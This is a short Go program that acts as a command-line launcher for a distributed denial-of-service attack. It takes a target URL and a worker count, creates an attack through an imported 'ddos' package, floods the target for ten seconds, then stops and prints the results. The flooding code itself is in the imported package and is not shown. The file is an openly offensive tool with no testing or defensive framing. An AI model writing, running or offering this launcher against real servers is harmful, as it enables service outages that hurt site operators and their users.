package main

import (
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/francisco/ddos/ddos"
)

func main() {
	url := os.Args[1]
	quantity := os.Args[2]

	quantityInt, _ := strconv.Atoi(quantity)

	fmt.Println("Starting...")
	fmt.Println("Server: ", url)
	atk, err := ddos.CreateDDOS(url, quantityInt)

	if err != nil {
		fmt.Println("Error: ", err)
	}

	atk.Start()
	time.Sleep(10000000000) // wait 10s to stop the DDOS method
	atk.Stop()
	fmt.Println(atk.Results())
}
